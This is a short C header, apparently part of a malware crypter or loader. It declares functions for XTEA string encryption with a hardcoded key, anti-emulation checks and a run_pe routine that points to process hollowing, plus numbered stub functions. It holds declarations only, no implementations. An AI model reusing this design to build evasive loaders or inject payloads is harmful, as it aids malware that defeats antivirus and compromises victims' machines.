#pragma once
#include <stdint.h>
#include <windows.h>

static unsigned int magic_key[8] = {0xBABE2525,0xBABE2525,0xBABE2525,0xBABE2525,0xBABE2525,0xBABE2525,0xBABE2525,0xBABE2525};

void Xtea3_Data_Crypt(char *inout, int len, bool encrypt, uint32_t *key);
uint32_t Murmur3(const void * key, int len, unsigned int seed);

void str_to_decrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key);
void str_to_encrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key);

uint8_t *antiemul_mem(uint32_t size_memory, uint8_t *data_protect, uint32_t size_data_protect);
void anti_emul_sleep(uintptr_t base, char *crypt_str, uint32_t size_str, uint32_t sleep_wait);
bool run_pe(uintptr_t base, BYTE *loaded_pe, size_t payloadImageSize, LPSTR targetPath);

void function1(void);
void function2(void);
void function3(void);
void function4(void);
void function5(void);
void function6(void);
void function7(void);
void function8(void);
void function9(void);
void function10(void);
void function11(void);
void function12(void);
void function13(void);
void function14(void);